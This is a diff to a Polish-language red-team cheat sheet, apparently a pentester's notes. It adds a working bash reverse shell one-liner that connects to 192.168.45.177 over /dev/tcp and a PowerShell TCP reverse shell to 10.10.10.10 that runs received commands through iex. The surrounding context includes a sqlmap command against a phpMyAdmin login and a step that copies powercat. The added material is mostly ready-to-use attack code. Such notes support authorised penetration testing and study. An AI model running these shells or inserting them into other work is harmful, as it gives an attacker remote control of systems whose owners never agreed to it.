@@ -335,6 +335,11 @@ Dla bardziej opornych serwerow
 ```
 sqlmap -u "http://10.114.131.93/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" --method POST --level 3 --risk 2 --batch --dbs
 ```
+## Webshell
+### Linux
+```bash
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.45.177/4444 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
+```
 # Red team - WINDOWS
 # AD
 ## Privileges
@@ -748,14 +753,20 @@ Enumeracja
 net view \\dc01 /all
 ```
 ## Webshell
-Reverse na winde
-```bash
-cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
-```
-Sprawdzanie czy na hoscie wykonuje sie przez CMD czy Powershell
+### Windows
+#### Sprawdzanie czy na hoscie wykonuje sie przez CMD czy Powershell
 ```bash
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
+#### Reverse one liner
+```pwsh
+$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+#### Reverse na winde
+```bash
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+```
+
 ## Notatki
 ### Encoding
 URL-encoding: / => %2f  
